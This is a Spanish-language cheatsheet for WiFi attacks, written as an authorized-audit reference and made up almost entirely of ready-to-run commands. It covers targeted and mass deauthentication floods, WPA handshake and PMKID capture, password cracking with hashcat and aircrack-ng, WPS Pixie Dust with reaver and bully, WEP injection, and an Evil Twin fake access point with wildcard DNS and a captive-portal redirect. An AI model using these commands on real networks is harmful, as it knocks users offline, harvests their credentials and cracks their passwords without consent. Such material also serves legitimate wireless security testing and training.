# Nombre: cheatsheet-wireless
# Descripción: Auditoría de redes WiFi: WPA/WPA2, captura de handshake, deauth, Evil Twin y cracking.
# Tags: wireless, wifi, aircrack, wpa, handshake, deauth, evil-twin, monitor
# Uso: referencia rápida para auditoría de redes inalámbricas (solo con autorización)

# Cheatsheet de Wireless

## 1. Preparación

```bash
# Comprobar interfaz
iwconfig
ip link show

# Habilitar modo monitor
airmon-ng start wlan0
airmon-ng check kill  # matar procesos que interfieren

# Verificar
iwconfig wlan0mon
```

## 2. Escaneo de Redes

```bash
# Ver redes, clientes, canales
airodump-ng wlan0mon

# Salida por columnas:
# BSSID = MAC del AP
# PWR = potencia de señal
# Beacons = frames de beacon
# #Data = paquetes de datos
# CH = canal
# ENC = encriptación (WPA2, WEP, OPN)
# ESSID = nombre de la red
```

## 3. Captura de Handshake WPA/WPA2

```bash
# Capturar tráfico de un AP específico
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w captura wlan0mon

# En otra terminal, deauth para forzar reconexión
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon
# -0 5 = 5 paquetes de deauth
# -a = BSSID del AP

# Deauth a un cliente específico
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon

# Verificar que se capturó el handshake
aircrack-ng captura-01.cap
# Buscar "WPA handshake: AA:BB:CC:CC:DD:EE" en la esquina superior
```

## 4. Ataque PMKID (sin clientes)

```bash
# Si no hay clientes conectados, capturar PMKID
hcxdumptool -i wlan0mon --enable_status=1 -o pmkid.pcapng

# Convertir para aircrack
hcxpcapngtool -o hash.hc22000 pmkid.pcapng

# Crackear
hashcat -m 22000 hash.hc22000 rockyou.txt
# O con aircrack
aircrack-ng -w rockyou.txt hash.hc22000
```

## 5. Evil Twin (AP Falso)

```bash
# airgeddon
airgeddon

# hostapd + dnsmasq
cat > hostapd.conf << 'EOF'
interface=wlan0
driver=nl80211
ssid=FreeWiFi
hw_mode=g
channel=6
wmm_enabled=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=0
EOF

hostapd hostapd.conf

# DHCP y DNS falso
cat > dnsmasq.conf << 'EOF'
interface=wlan0
dhcp-range=10.0.0.10,10.0.0.50,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
EOF

dnsmasq -C dnsmasq.conf

# Redirect a portal cautivo
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80
```

## 6. Cracking de Handshake

```bash
# Aircrack-ng (CPU)
aircrack-ng -w rockyou.txt captura-01.cap
aircrack-ng -w rockyou.txt -b AA:BB:CC:DD:EE:FF captura-01.cap

# Hashcat (GPU, más rápido)
# Convertir cap a hccapx
aircrack-ng -j converted captura-01.cap
hashcat -m 2500 converted.hccapx rockyou.txt

# o directamente con hc22000
hcxpcapngtool -o hash.hc22000 captura-01.cap
hashcat -m 22000 hash.hc22000 rockyou.txt

# Wordlists
/usr/share/wordlists/rockyou.txt
/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt
```

## 7. Ataque Pixie Dust (WPS)

```bash
# Detectar WPS
wash -i wlan0mon

# Ataque Pixie Dust (rápido, funciona en APs débiles)
reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -c 6 -vv

# Bullying WPS
bully -b AA:BB:CC:DD:EE:FF -c 6 -d -v 3 wlan0mon
```

## 8. WEP (obsoleto pero posible)

```bash
# Capturar IVs
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w wep_capture wlan0mon

# Inyectar tráfico para generar IVs
aireplay-ng -3 -b AA:BB:CC:DD:EE:FF wlan0mon

# Crackear
aircrack-ng wep_capture-01.cap
```

## 9. Recon Pasivo

```bash
# Kismet
kismet -c wlan0mon

# Bettercap (si soporta WiFi)
caplet: wifi.recon on

# Ver clientes sin interactuar
airodump-ng --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

## 10. Desautenticación y Denegación

```bash
# Deauth masivo (todas las redes)
aireplay-ng --deauth 10 -a FF:FF:FF:FF:FF:FF wlan0mon

# Deauth dirigido
aireplay-ng --deauth 0 -a AP_BSSID -c CLIENT_BSSID wlan0mon
# -0 0 = deauth continuo (cuidado)

# mdk3 (más potente)
mdk3 wlan0mon d -b AA:BB:CC:DD:EE:FF  # deauth a BSSID
mdk3 wlan0mon d  # deauth masivo
```

## Verificación

```bash
# Verificar que el handshake se capturó
aircrack-ng captura-01.cap | grep "WPA handshake"

# Verificar modo monitor
iwconfig wlan0mon | grep "Mode:Monitor"

# Verificar que el AP está activo
airodump-ng --bssid AA:BB:CC:DD:EE:FF wlan0mon
```

## Tips
- Siempre usar autorización escrita antes de auditorías WiFi
- El handshake se captura cuando un cliente se conecta/deconecta
- PMKID funciona sin clientes (mejor para WPA2)
- Evil Twin requiere tarjeta que soporte inyección
- `hashcat` con GPU es mucho más rápido que `aircrack` con CPU
- Probar wordlists variadas: rockyou + common + personalizado
- Capturar el mayor tiempo posible para asegurar el handshake
